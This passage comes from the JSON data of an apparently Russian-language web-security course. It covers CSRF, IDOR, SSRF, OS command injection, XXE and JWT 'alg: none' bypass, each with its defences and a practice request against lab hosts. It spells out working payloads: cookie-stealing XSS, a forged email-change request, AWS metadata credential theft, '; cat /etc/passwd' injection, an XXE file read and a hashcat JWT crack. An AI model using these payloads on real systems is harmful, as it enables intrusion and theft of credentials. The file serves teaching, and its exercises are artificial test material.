            "task": "Допишите скрипт.",
            "starterCode": "# Вы перехватили запрос добавления комментария в блог (Stored XSS).\n# Сайт никак не фильтрует (не эскейпит) параметр 'text'.\n\n# Задача:\n# Внедрите в параметр 'text' классический XSS пейлоад.\n# Используйте тег <script>, внутри которого вызовите: alert(document.cookie)\n\nPOST /add_comment HTTP/1.1\nHost: vulnerable-forum.thm\nContent-Type: application/x-www-form-urlencoded\n\npost_id=42&text=Hello, nice post!"
        },
        "type": "http"
    },
    {
        "id": "lesson-4",
        "title": "Cross-Site Request Forgery (CSRF)",
        "theory": {
            "sections": [
                {
                    "type": "heading",
                    "content": "Подделка межсайтовых запросов"
                },
                {
                    "type": "text",
                    "content": "Представьте, что вы залогинились в bank.com. Браузер сохранил вашу Cookie. В другой вкладке вы открыли сайт хакера evil.com. Хакер разместил там невидимую форму:"
                },
                {
                    "type": "code",
                    "content": "<form action=\"http://bank.com/transfer\" method=\"POST\">\n    <input type=\"hidden\" name=\"to\" value=\"Hacker\">\n    <input type=\"hidden\" name=\"amount\" value=\"1000\">\n</form>\n<script>document.forms[0].submit();</script>"
                },
                {
                    "type": "text",
                    "content": "Браузер отправляет POST-запрос в банк. И самое страшное: браузер автоматически прикрепляет вашу банковскую Cookie к этому запросу! Банк думает, что это вы сами нажали кнопку \"Перевести\", и переводит деньги. CSRF эксплуатирует доверие сервера к браузеру."
                },
                {
                    "type": "tip",
                    "content": "Защита 1: Anti-CSRF Tokens Сервер генерирует случайную строку (Токен) и вставляет её скрытым полем <input type=\"hidden\" name=\"csrf_token\" value=\"abc123xyz\"> в каждую вашу форму. При отправке денег сервер сверяет токен из запроса с токеном в сессии. Сайт хакера (из-за политики SOP) не может прочитать этот токен с сайта банка, поэтому подделать форму становится невозможно."
                },
                {
                    "type": "tip",
                    "content": "Защита 2: Атрибут SameSite Встроенная защита современных браузеров. Если кука выдана с флагом Set-Cookie: session=123; SameSite=Lax (или Strict), браузер откажется прикреплять её к POST-запросам, которые инициированы с другого домена (evil.com). Это практически убило классический CSRF, но пентестеры всё еще находят старые системы с SameSite=None."
                }
            ]
        },
        "practice": {
            "title": "Практика",
            "description": "Модифицируйте сырой HTTP-запрос для эксплуатации уязвимости.",
            "task": "Допишите скрипт.",
            "starterCode": "# Вы анализируете эндпоинт изменения Email адреса.\n# Вы заметили, что:\n# 1. Запрос использует метод GET (что категорически запрещено для изменения состояния).\n# 2. В запросе НЕТ Anti-CSRF токена!\n\n# Задача: \n# Вы пишете код для сайта хакера. \n# Разместите в поле 'payload' HTML-тег картинки <img>. \n# В атрибут src поместите вредоносный URL: http://bank.thm/change_email?email=hacker@evil.com\n# При попытке браузера загрузить картинку, он выполнит GET-запрос с куками жертвы!\n\nPOST /hacker-site/save_payload HTTP/1.1\nHost: evil.thm\nContent-Type: application/x-www-form-urlencoded\n\npayload="
        },
        "type": "http"
    },
    {
        "id": "lesson-5",
        "title": "IDOR и BOLA (Broken Access Control)",
        "theory": {
            "sections": [
                {
                    "type": "heading",
                    "content": "IDOR (Insecure Direct Object Reference)"
                },
                {
                    "type": "text",
                    "content": "OWASP Top 1 последних лет — это сломанный контроль доступа. Уязвимость возникает, когда сервер проверяет, что вы залогинены, но забывает проверить, имеете ли вы право доступа к конкретному объекту."
                },
                {
                    "type": "text",
                    "content": "Вы открываете свой счет за заказ: https://shop.com/receipt?id=5102. Вы просто меняете URL на ?id=5101. Сервер послушно возвращает вам чек чужого пользователя (с его адресом и картой)!"
                },
                {
                    "type": "tip",
                    "content": "BOLA (Broken Object Level Authorization) в API В современных REST/GraphQL API эта уязвимость называется BOLA. Хакер перехватывает мобильный трафик, видит запрос GET /api/v1/users/777, и отправляет его в Burp Intruder. Intruder автоматически перебирает цифры от 1 до 100000, и хакер за 5 минут скачивает всю базу данных пользователей сервиса (Mass Enumeration)."
                },
                {
                    "type": "tip",
                    "content": "Защита: UUID и Проверка владельца 1. UUIDv4: Вместо порядковых ID (1, 2, 3), используйте длинные рандомные идентификаторы (f47ac10b-58cc-4372-a567-0e02b2c3d479). Подобрать чужой ID брутфорсом станет невозможно (вероятность 1 к триллионам). 2. Строгий Access Control: Бэкенд ВСЕГДА должен сравнивать: if (requested_order.user_id != current_session.user_id) throw 403 Forbidden;."
                }
            ]
        },
        "practice": {
            "title": "Практика",
            "description": "Модифицируйте сырой HTTP-запрос для эксплуатации уязвимости.",
            "task": "Допишите скрипт.",
            "starterCode": "# Вы перехватили запрос на просмотр электронного чека за ваш заказ.\n# Ваш ID заказа: 905. \n# Вы предполагаете, что самый первый заказ в системе (с ID = 1)\n# принадлежит администратору или директору.\n\n# Задача (IDOR): \n# Измените параметры запроса так, чтобы просмотреть чужой заказ.\n\nGET /api/orders/receipt?order_id=905 HTTP/1.1\nHost: shop.thm\nCookie: session=user_xyz"
        },
        "type": "http"
    },
    {
        "id": "lesson-6",
        "title": "SSRF (Server-Side Request Forgery)",
        "theory": {
            "sections": [
                {
                    "type": "heading",
                    "content": "Заставляем сервер работать на нас"
                },
                {
                    "type": "text",
                    "content": "SSRF — это уязвимость, позволяющая хакеру заставить веб-сервер отправить HTTP-запрос на произвольный домен по выбору хакера. Обычно это происходит в функциях типа \"Загрузить аватар по URL\" или \"Сделать превью ссылки\"."
                },
                {
                    "type": "text",
                    "content": "Сервер берет URL хакера (?url=http://evil.com/img.jpg), делает к нему запрос ОТ СВОЕГО ИМЕНИ и возвращает результат."
                },
                {
                    "type": "heading",
                    "content": "В чем критическая опасность?"
                },
                {
                    "type": "text",
                    "content": "Хакер передает ?url=http://localhost:3306 (или 127.0.0.1). Запрос исходит изнутри самого сервера! Это позволяет хакеру обойти внешние фаерволы и обращаться к локальным портам сервера (Redis, MySQL, скрытые панели админов), которые торчат только наружу localhost."
                },
                {
                    "type": "tip",
                    "content": "Облачный Апокалипсис (AWS Metadata SSRF) Почти все современные сайты работают в облаках (AWS, Google Cloud). В AWS есть захардкоженный внутренний IP-адрес 169.254.169.254. К нему можно обратиться только изнутри сервера EC2, чтобы получить метаданные. Хакер отправляет SSRF: ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/. Сервер послушно делает запрос к облаку и возвращает хакеру AWS Access Keys (Секретные ключи администратора). Хакер получает полный контроль над всей облачной инфраструктурой компании (именно так хакнули банк Capital One)."
                }
            ]
        },
        "practice": {
            "title": "Практика",
            "description": "Модифицируйте сырой HTTP-запрос для эксплуатации уязвимости.",
            "task": "Допишите скрипт.",
            "starterCode": "# Сайт позволяет проверять статус сторонних API через эндпоинт /check_status\n# Сервер берет ваш URL и выполняет к нему HTTP-запрос изнутри своей сети.\n\n# Задача (SSRF): \n# Замените 'http://google.com' на магический внутренний IP-адрес \n# AWS Metadata (169.254.169.254), чтобы вытащить секретные ключи IAM роли сервера!\n# Полный путь: http://169.254.169.254/latest/meta-data/iam/security-credentials/admin\n\nPOST /api/check_status HTTP/1.1\nHost: cloud-app.thm\nContent-Type: application/x-www-form-urlencoded\n\ntarget_url=http://google.com"
        },
        "type": "http"
    },
    {
        "id": "lesson-7",
        "title": "OS Command Injection (RCE)",
        "theory": {
            "sections": [
                {
                    "type": "heading",
                    "content": "Внедрение команд ОС"
                },
                {
                    "type": "text",
                    "content": "Если SQLi позволяет выполнять команды базы данных, то OS Command Injection позволяет выполнять команды операционной системы Linux/Windows напрямую. Это моментальный RCE (Remote Code Execution) и полный захват сервера."
                },
                {
                    "type": "tip",
                    "content": "Уязвимый код (PHP):"
                },
                {
                    "type": "code",
                    "content": "$target = $_POST['ip'];\n// Программа пингует введенный IP, запуская консоль Linux\nsystem(\"ping -c 3 \" . $target);"
                },
                {
                    "type": "heading",
                    "content": "Техника эксплуатации (Метасимволы Shell)"
                },
                {
                    "type": "text",
                    "content": "В терминале Linux можно запустить несколько команд друг за другом, используя разделители:"
                },
                {
                    "type": "list",
                    "items": [
                        "; (Точка с запятой) — выполнить следующую команду безусловно.",
                        "&& (Логическое И) — выполнить вторую команду, только если первая удалась.",
                        "| (Пайп) — передать результат первой команды во вторую."
                    ]
                },
                {
                    "type": "text",
                    "content": "Если хакер введет в поле IP: 8.8.8.8; cat /etc/passwd, сервер выполнит:\n        ping -c 3 8.8.8.8; cat /etc/passwd.\n        Сначала пройдет пинг, а затем сервер послушно выведет системный файл с пользователями на экран!"
                },
                {
                    "type": "tip",
                    "content": "Защита Никогда не используйте функции system(), exec() или os.system() с пользовательским вводом. Если это жизненно необходимо, используйте встроенные функции ОС для экранирования (например, escapeshellarg() в PHP), которые превращают весь ввод хакера в одну безопасную строку (оборачивают в кавычки)."
                }
            ]
        },
        "practice": {
            "title": "Практика",
            "description": "Модифицируйте сырой HTTP-запрос для эксплуатации уязвимости.",
            "task": "Допишите скрипт.",
            "starterCode": "# Мы перехватили запрос к инструменту \"Network Diagnostic Tool\" (как в DVWA).\n# Инструмент принимает параметр 'ip' и выполняет консольную команду ping.\n\n# Задача:\n# Внедрите OS Command Injection! \n# После IP-адреса (например, 127.0.0.1) добавьте разделитель (точку с запятой ;) \n# и напишите команду для чтения файла: cat /etc/passwd\n\nPOST /tools/ping HTTP/1.1\nHost: vulnerable-admin.thm\nContent-Type: application/x-www-form-urlencoded\n\nip=127.0.0.1"
        },
        "type": "http"
    },
    {
        "id": "lesson-8",
        "title": "XXE (XML External Entity)",
        "theory": {
            "sections": [
                {
                    "type": "heading",
                    "content": "Парсинг XML"
                },
                {
                    "type": "text",
                    "content": "Многие энтерпрайз-приложения (B2B, банки, SOAP API) обмениваются данными не в формате JSON, а в формате XML. За обработку XML на сервере отвечают парсеры (например, libxml2)."
                },
                {
                    "type": "heading",
                    "content": "В чем уязвимость?"
                },
                {
                    "type": "text",
                    "content": "В стандарте XML есть древняя и опасная фича — DTD (Document Type Definition) и Сущности (Entities). Entity — это как переменная. Вы объявляете её в начале XML, а потом подставляете в текст. Но стандарт позволяет создавать Внешние Сущности (External Entities), которые берут значение из локального файла на сервере или даже по HTTP!"
                },
                {
                    "type": "tip",
                    "content": "Анатомия атаки XXE Хакер отправляет на сервер модифицированный XML: <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]> Здесь мы объявили сущность xxe, которая читает системный файл. Далее в теле XML мы вызываем её: <productId>&xxe;</productId> Уязвимый XML-парсер видит SYSTEM \"file://...\", послушно читает файл с диска сервера, подставляет его текст вместо &xxe;, и сервер возвращает нам результат!"
                },
                {
                    "type": "tip",
                    "content": "Защита от XXE Поскольку эта фича встроена в сам стандарт XML, единственный надежный способ защиты  полностью отключить обработку внешних сущностей (DTD) в настройках вашего XML-парсера на бэкенде."
                }
            ]
        },
        "practice": {
            "title": "Практика",
            "description": "Модифицируйте сырой HTTP-запрос для эксплуатации уязвимости.",
            "task": "Допишите скрипт.",
            "starterCode": "# Вы перехватили запрос к API проверки наличия товара (Stock Check).\n# Приложение принимает данные в формате XML.\n\n# Задача (XXE Attack):\n# 1. Сразу после XML декларации, добавьте определение DTD:\n# <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n# 2. Внутри тега <productId> замените цифру 1 на вашу сущность: &xxe;\n\nPOST /api/stock HTTP/1.1\nHost: enterprise-shop.thm\nContent-Type: application/xml\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<stockCheck>\n    <productId>1</productId>\n    <storeId>1</storeId>\n</stockCheck>"
        },
        "type": "http"
    },
    {
        "id": "lesson-9",
        "title": "Уязвимости JWT (JSON Web Tokens)",
        "theory": {
            "sections": [
                {
                    "type": "heading",
                    "content": "Эра микросервисов и JWT"
                },
                {
                    "type": "text",
                    "content": "Раньше сессии хранились в оперативной памяти сервера (Session ID). Сегодня микросервисы используют Stateless авторизацию через JWT. JWT — это длинная строка, которую выдает сервер при логине. Браузер прикрепляет её в заголовок Authorization: Bearer <token> ко всем запросам."
                },
                {
                    "type": "heading",
                    "content": "Анатомия JWT"
                },
                {
                    "type": "text",
                    "content": "Токен состоит из 3 частей, разделенных точкой: HEADER . PAYLOAD . SIGNATURE."
                },
                {
                    "type": "list",
                    "items": [
                        "Header: Указывает алгоритм шифрования (например, {\"alg\": \"HS256\"}).",
                        "Payload: Сами данные пользователя (например, {\"user\": \"guest\", \"role\": \"user\"}). ВНИМАНИЕ: Header и Payload НЕ ЗАШИФРОВАНЫ! Это просто кодировка Base64Url. Любой может их прочитать и изменить.",
                        "Signature (Подпись): Это криптографический хэш (Header + Payload + Secret Key сервера). Именно подпись гарантирует, что хакер не изменил Payload. Сервер пересчитывает подпись и, если она не совпадает, бракует токен."
                    ]
                },
                {
                    "type": "tip",
                    "content": "Атака \"alg: none\" (Bypass) Плохие библиотеки JWT поддерживали алгоритм none (без подписи). Хакер берет свой JWT, декодирует Base64, меняет в Header алгоритм на \"alg\": \"none\", меняет в Payload \"role\": \"admin\", и вообще удаляет часть с Signature. Сервер видит алгоритм none, решает, что подпись проверять не нужно, и пускает хакера под админом!"
                },
                {
                    "type": "tip",
                    "content": "Подбор секретного ключа (Bruteforce) Если сервер использует слабый секретный ключ (например, \"secret123\"), хакер может скормить JWT программе Hashcat: hashcat -m 16500 jwt.txt rockyou.txt. Вычислив секрет, хакер сможет генерировать валидные JWT с подписью для ЛЮБЫХ пользователей!"
                }
            ]
        },
        "practice": {
            "title": "Практика",
            "description": "Модифицируйте сырой HTTP-запрос для эксплуатации уязвимости.",
            "task": "Допишите скрипт.",
            "starterCode": "# Мы перехватили запрос к админ-панели.\n# Сервер использует уязвимую библиотеку JWT, которая принимает токены без подписи (alg: none).\n\n# Нормальный токен: \n# Header: {\"alg\": \"HS256\"} -> eyJhbGciOiJIUzI1NiJ9\n# Payload: {\"user\": \"guest\"} -> eyJ1c2VyIjoiZ3Vlc3QifQ\n# Signature: ...hash...\n\n# Задача (JWT Bypass):\n# Мы уже закодировали для вас поддельные части:\n# Fake Header: {\"alg\": \"none\"} -> eyJhbGciOiJub25lIn0\n# Fake Payload: {\"user\": \"admin\"} -> eyJ1c2VyIjoiYWRtaW4ifQ\n\n# Склейте поддельный Header и Payload через точку. \n# Подпись оставьте ПУСТОЙ (просто поставьте точку в конце: Header.Payload. )\n# Замените токен в заголовке Authorization!\n\nGET /api/admin/dashboard HTTP/1.1\nHost: api.startup.thm\nAuthorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
        },
        "type": "http"
    }
] 
  }
};
